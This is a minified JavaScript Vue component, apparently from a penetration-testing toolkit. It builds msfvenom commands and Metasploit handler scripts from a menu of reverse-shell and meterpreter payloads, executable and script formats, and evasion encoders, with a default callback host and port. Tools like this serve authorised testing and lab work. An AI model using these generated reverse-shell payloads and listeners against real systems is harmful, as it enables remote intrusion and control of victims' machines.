import{u as W,i as T}from"./action-BSi9h3E1.js";import{u as z}from"./globalVars-DRNK-qHl.js";import{l as C,az as U,z as H,A as p,H as s,y as k,C as i,J as o,u as a,K as h,D as A,G as b}from"./vendor-C2WOFBut.js";import{_ as R}from"./tool-BsZ2CvQX.js";import"./vendor-lodash-BDISS5yc.js";import"./modulepreload-polyfill-B5Qt9EMX.js";import"./vendor-monaco-Dc_R4fc0.js";const D={class:"sectool-msfvenom-section-title"},I={class:"sectool-msfvenom-section-title",style:{"margin-top":"8px"}},M=C({__name:"Msfvenom",async setup(N){let u,v;const{getVar:c}=z(),x=c("LHOST")||"10.10.14.1",f=c("LPORT")||"4444",w=[{value:"windows/meterpreter/reverse_tcp",label:"[Windows] windows/meterpreter/reverse_tcp"},{value:"windows/meterpreter/reverse_https",label:"[Windows] windows/meterpreter/reverse_https"},{value:"windows/shell_reverse_tcp",label:"[Windows] windows/shell_reverse_tcp"},{value:"windows/x64/meterpreter/reverse_tcp",label:"[Windows] windows/x64/meterpreter/reverse_tcp"},{value:"windows/x64/shell_reverse_tcp",label:"[Windows] windows/x64/shell_reverse_tcp"},{value:"linux/x86/meterpreter/reverse_tcp",label:"[Linux] linux/x86/meterpreter/reverse_tcp"},{value:"linux/x64/shell_reverse_tcp",label:"[Linux] linux/x64/shell_reverse_tcp"},{value:"linux/x86/shell_reverse_tcp",label:"[Linux] linux/x86/shell_reverse_tcp"},{value:"osx/x64/shell_reverse_tcp",label:"[macOS] osx/x64/shell_reverse_tcp"},{value:"php/meterpreter/reverse_tcp",label:"[Web] php/meterpreter/reverse_tcp"},{value:"php/reverse_php",label:"[Web] php/reverse_php"},{value:"java/jsp_shell_reverse_tcp",label:"[Web] java/jsp_shell_reverse_tcp"},{value:"python/meterpreter/reverse_tcp",label:"[Web] python/meterpreter/reverse_tcp"},{value:"python/shell_reverse_tcp",label:"[Web] python/shell_reverse_tcp"},{value:"cmd/unix/reverse_bash",label:"[Script] cmd/unix/reverse_bash"},{value:"cmd/unix/reverse_python",label:"[Script] cmd/unix/reverse_python"},{value:"cmd/unix/reverse_netcat",label:"[Script] cmd/unix/reverse_netcat"},{value:"android/meterpreter/reverse_tcp",label:"[Android] android/meterpreter/reverse_tcp"}],y=[{value:"exe",label:"exe"},{value:"elf",label:"elf"},{value:"raw",label:"raw"},{value:"python",label:"python"},{value:"c",label:"c"},{value:"csharp",label:"csharp"},{value:"ruby",label:"ruby"},{value:"dll",label:"dll"},{value:"msi",label:"msi"},{value:"psh",label:"psh"},{value:"psh-cmd",label:"psh-cmd"},{value:"psh-net",label:"psh-net"},{value:"hta-psh",label:"hta-psh"},{value:"war",label:"war"},{value:"jar",label:"jar"},{value:"asp",label:"asp"},{value:"aspx",label:"aspx"},{value:"jsp",label:"jsp"}],V=[{value:"",label:"None"},{value:"x86/shikata_ga_nai",label:"x86/shikata_ga_nai"},{value:"x86/jmp_call_additive",label:"x86/jmp_call_additive"},{value:"x64/xor",label:"x64/xor"},{value:"x64/zutto_dekiru",label:"x64/zutto_dekiru"},{value:"cmd/powershell_base64",label:"cmd/powershell_base64"},{value:"php/base64",label:"php/base64"}],g={exe:"exe",elf:"elf",raw:"bin",python:"py",c:"c",csharp:"cs",ruby:"rb",dll:"dll",msi:"msi",psh:"ps1","psh-cmd":"cmd","psh-net":"ps1","hta-psh":"hta",war:"war",jar:"jar",asp:"asp",aspx:"aspx",jsp:"jsp"},l=W(([u,v]=U(()=>T({payload:"windows/meterpreter/reverse_tcp",lhost:x,lport:f,format:"exe",encoder:"",iterations:"3",extraOptions:""})),u=await u,v(),u)),j=b(()=>{var e="msfvenom";e=e+" -p "+l.current.payload,e=e+" LHOST="+l.current.lhost,e=e+" LPORT="+l.current.lport;var r=l.current.extraOptions.trim();r&&(e=e+" "+r),l.current.encoder&&(e=e+" -e "+l.current.encoder,e=e+" -i "+(l.current.iterations||"3")),e=e+" -f "+l.current.format;var n=g[l.current.format]||l.current.format;return e=e+" -o payload."+n,e}),O=b(()=>{const e=[];return e.push("use exploit/multi/handler"),e.push("set payload "+l.current.payload),e.push("set LHOST "+l.current.lhost),e.push("set LPORT "+l.current.lport),e.push("exploit"),e.join(`
`)});return(e,r)=>{const n=s("Select"),d=s("Input"),m=s("Align"),L=s("Display"),_=s("Textarea"),S=s("HeightResize");return k(),H(S,null,{default:p(({height:$})=>[i("div",{style:A([{height:$+"px"},{overflow:"auto",padding:"5px"}])},[o(L,null,{default:p(()=>[o(m,{direction:"vertical"},{default:p(()=>[o(n,{modelValue:a(l).current.payload,"onUpdate:modelValue":r[0]||(r[0]=t=>a(l).current.payload=t),label:e.$t("msfvenom_payload"),options:w},null,8,["modelValue","label"]),o(m,null,{default:p(()=>[o(d,{modelValue:a(l).current.lhost,"onUpdate:modelValue":r[1]||(r[1]=t=>a(l).current.lhost=t),label:e.$t("msfvenom_lhost"),placeholder:"10.10.14.1"},null,8,["modelValue","label"]),o(d,{modelValue:a(l).current.lport,"onUpdate:modelValue":r[2]||(r[2]=t=>a(l).current.lport=t),label:e.$t("msfvenom_lport"),placeholder:"4444"},null,8,["modelValue","label"])]),_:1}),o(n,{modelValue:a(l).current.format,"onUpdate:modelValue":r[3]||(r[3]=t=>a(l).current.format=t),label:e.$t("msfvenom_format"),options:y},null,8,["modelValue","label"]),o(m,null,{default:p(()=>[o(n,{modelValue:a(l).current.encoder,"onUpdate:modelValue":r[4]||(r[4]=t=>a(l).current.encoder=t),label:e.$t("msfvenom_encoder"),options:V},null,8,["modelValue","label"]),o(d,{modelValue:a(l).current.iterations,"onUpdate:modelValue":r[5]||(r[5]=t=>a(l).current.iterations=t),label:e.$t("msfvenom_iterations"),placeholder:"3"},null,8,["modelValue","label"])]),_:1}),o(d,{modelValue:a(l).current.extraOptions,"onUpdate:modelValue":r[6]||(r[6]=t=>a(l).current.extraOptions=t),label:e.$t("msfvenom_extra_options"),placeholder:"PrependMigrate=true EXITFUNC=thread"},null,8,["modelValue","label"])]),_:1})]),_:1}),i("div",D,h(e.$t("msfvenom_generated_cmd")),1),o(_,{"model-value":j.value,height:72,placeholder:e.$t("msfvenom_cmd_label"),copy:"msfvenom"},null,8,["model-value","placeholder"]),i("div",I,h(e.$t("msfvenom_handler_title")),1),o(_,{"model-value":O.value,height:130,placeholder:e.$t("msfvenom_handler_label"),copy:"Handler"},null,8,["model-value","placeholder"])],4)]),_:1})}}}),X=R(M,[["__scopeId","data-v-06445692"]]);export{X as default};
